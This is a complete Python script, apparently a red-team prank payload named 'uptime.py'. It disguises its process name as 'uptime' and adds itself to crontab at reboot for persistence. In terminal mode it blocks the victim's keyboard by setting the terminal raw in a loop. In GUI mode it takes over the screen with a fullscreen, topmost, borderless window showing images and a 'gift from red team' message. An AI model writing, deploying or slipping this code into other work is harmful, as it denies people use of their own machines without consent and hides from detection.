#!/usr/bin/env python3
# uptime.py - Red Team full takeover edition

import os
import sys
import time
import random
import subprocess
import platform

try:
    from PIL import Image, ImageTk
    import tkinter as tk
    has_pil = True
except:
    has_pil = False

SCRIPT = os.path.abspath(__file__)
PID    = os.path.expanduser("~/.rt_pid")
DELAY  = os.path.expanduser("~/.rt_delay")
DEFAULT_DELAY = 20000   # ms

def get_delay():
    try:
        return max(5000, int(open(DELAY).read().strip()))
    except:
        return DEFAULT_DELAY

def rename():
    if platform.system() == "Linux":
        try:
            import ctypes
            ctypes.CDLL("libc.so.6").prctl(15, b"uptime\0", 0, 0, 0)
        except: pass

def persist():
    line = f"@reboot python3 \"{SCRIPT}\"\n"
    try:
        c = subprocess.check_output("crontab -l 2>/dev/null || true", shell=True).decode()
        if line not in c:
            subprocess.run("crontab -", shell=True, input=(c+line).encode())
    except: pass

# ———————— TERMINAL TAKEOVER MODE ————————
RED_TEAM_BANNER = """
██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
                — a gift from red team —
"""

def terminal_torture():
    rename()
    try:
        import termios, tty
    except:
        # Fallback if termios missing (rare)
        while True:
            os.system("clear")
            print("\033[91m" + RED_TEAM_BANNER + "\033[0m")
            time.sleep(get_delay()/1000)

    # Real input-blocking version
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        while True:
            os.system("clear")
            print("\033[91m" + RED_TEAM_BANNER.center(100) + "\033[0m")

            # Disable terminal echo & canonical mode → keyboard is dead
            tty.setraw(fd)
            start = time.time()
            while time.time() - start < get_delay()/1000:
                time.sleep(0.1)   # victim can't type anything

            # Re-enable input for a split second so shell doesn't crash
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
            time.sleep(0.01)
    except:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)

# ———————— GUI MODE ————————
def run_gui():
    if not has_pil: return False
    d = os.path.dirname(SCRIPT)
    imgs = [f for f in os.listdir(d) if f.lower().endswith(('.png','.jpg','.jpeg','.gif','.bmp','.webp'))]
    if not imgs: return False

    if os.path.exists(PID):
        try: os.kill(int(open(PID).read()), 15)
        except: pass

    r = tk.Tk()
    r.attributes("-fullscreen",True,"-topmost",True)
    r.configure(bg="black")
    r.overrideredirect(True)
    c = tk.Canvas(r,bg="black",highlightthickness=0)
    c.pack(fill="both",expand=True)

    def show():
        i = Image.open(os.path.join(d,random.choice(imgs)))
        w,h = r.winfo_screenwidth(),r.winfo_screenheight()
        bg = Image.new("RGB",(w,h),"black")
        i.thumbnail((w,h-200),Image.LANCZOS)
        bg.paste(i,((w-i.width)//2,(h-i.height)//2-80))
        p = ImageTk.PhotoImage(bg)
        c.create_image(w//2,h//2,image=p)

        c.create_text(w//2, h-100,
                      text="— a gift from red team —",
                      fill="#ff0000", font=("Impact", 60, "bold"))

        c.image = p
        r.after(get_delay(),show)

    open(PID,"w").write(str(os.getpid()))
    rename()
    show()
    r.mainloop()
    return True

# ———————— MAIN ————————
if __name__ == "__main__":
    rename()

    if "--setup" in sys.argv:
        persist()
        print("[+] Red Team payload installed permanently")
        sys.exit(0)

    # Terminal takeover mode (blocks keyboard!)
    if "--terminal" in sys.argv or not os.getenv("DISPLAY"):
        terminal_torture()

    # GUI mode with images + red text
    if not run_gui():
        terminal_torture()   # fallback
